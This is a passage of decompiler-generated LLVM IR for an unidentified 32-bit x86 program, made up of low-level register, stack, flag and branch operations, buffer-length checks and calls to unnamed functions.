  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_80529e0()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_80526d0()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554eb.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_80526d0()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049496, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_80530f9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_805328e()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
  %v3_8049550 = load i32, i32* %v2_8049550, align 4
  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
  %v3_8049556 = inttoptr i32 %v2_8049556 to i32*
  store i32 %v2_8049554, i32* %v3_8049556, align 4
  %v0_8049559 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049559 = inttoptr i32 %v0_8049559 to i32*
  %v2_8049559 = load i32, i32* %v1_8049559, align 4
